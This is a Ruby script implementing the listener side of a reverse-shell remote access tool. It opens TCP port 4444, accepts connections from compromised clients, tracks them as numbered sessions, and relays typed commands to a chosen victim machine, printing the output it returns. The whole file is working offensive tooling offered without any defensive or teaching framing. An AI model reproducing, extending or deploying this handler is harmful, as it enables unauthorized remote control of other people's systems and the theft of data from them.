#!/usr/bin/env ruby
require 'socket'
require 'open3'
require './core'
include MainCommands
def main_shell()
	main = Readline.readline('main> ', true)
	main_shell if main.strip == ''
	case main.split(' ')[0]
		when 'list_sessions'
			list_sessions(@client_hash)
		when 'help'
			help()
		when 'exit'
			Kernel.exit
	  when 'use_session'
	    @session_id = main.split(' ')[1]
			if @session_id == nil
				print_error("No ID\n")
				main_shell()
			else
			  use_session(@client_array[@session_id.to_i])
			end
		else
			stdin, stdout_and_stderr = Open3.popen2e("#{main}")
			print_info("OS Command!\n")
			print "#{stdout_and_stderr.readlines.join.chomp}\n"
		  main_shell()
	end
  rescue => e
	  print_error("#{e}\n")
	  main_shell()
end
def command_client(client)
	loop {
		command = [(print ("#{@client_hash[:"#{@session_id}"]}:shell> ")), $stdin.gets.rstrip][1]
		case command
		  when 'exit'
				client.print("#{command}\0")
				client.close()
			when ''
				command_client(client)
      when 'background'
				print_info("Backgrounding Session!\n")
				background()
			else
				client.print("#{command}\0")
		end
		out_put = ''
		recv_length = 1024
		while (tmp = client.recv(recv_length))
			out_put += tmp
			break if tmp.length < recv_length
		end
		puts out_put.chomp
	}
end
begin
	@client_hash = {}
	client_id = "0"
	@client_array = []
	server = TCPServer.open(4444) 
	Thread.new {	
    loop {
      Thread.start(server.accept) do |client|
				@client_array << client
				client_name = client.recv(1024)
			  print_success("#{client_name}")
			  @client_hash[:"#{client_id}"] = client_name
			  client_id = client_id.to_i
			  client_id += 1
			  client_id = client_id.to_s
		  end
     }
	}
	Thread.new { client_status(@client_array,@client_hash) }
  main_shell()
	rescue => error
    print_error("#{error}\n")
end
